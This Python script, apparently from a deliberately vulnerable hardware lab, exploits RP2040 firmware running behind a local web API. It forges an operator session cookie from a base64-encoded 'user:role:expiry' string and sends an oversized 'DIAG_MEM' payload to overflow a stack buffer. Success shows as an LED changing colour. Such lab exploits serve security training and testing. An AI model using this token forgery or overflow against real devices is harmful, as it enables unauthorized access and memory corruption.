#!/usr/bin/env python3
"""Attack 8: Firmware Stack Buffer Overflow (DIAG_MEM).

Sends a 40-byte payload to overflow the stack buffer on the RP2040 firmware.
"""

import base64

import requests

BASE_URL = "http://localhost:5000"


def test_attack_8():
    print("[+] Running Individual Attack 8: Firmware Stack Overflow (DIAG_MEM)...")
    overflow_data = "DIAG_MEM " + ("A" * 40)
    hex_payload = overflow_data.encode("utf-8").hex()
    url = f"{BASE_URL}/api/radio/send"
    token = base64.b64encode(b"operator:operator:9999999999").decode("utf-8")
    cookies = {"session_token": token}
    try:
        response = requests.post(url, json={"data": hex_payload}, cookies=cookies, timeout=5)
        print(f"[*] POST {url} (payload > 32 bytes) - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Overflow payload transmitted! Check that the NeoPixel LED turns PURPLE.")
            print(response.json())
        else:
            print(f"[!] Injection rejected: {response.text}")
    except Exception as e:
        print(f"[X] Connection error: {e}")


if __name__ == "__main__":
    test_attack_8()
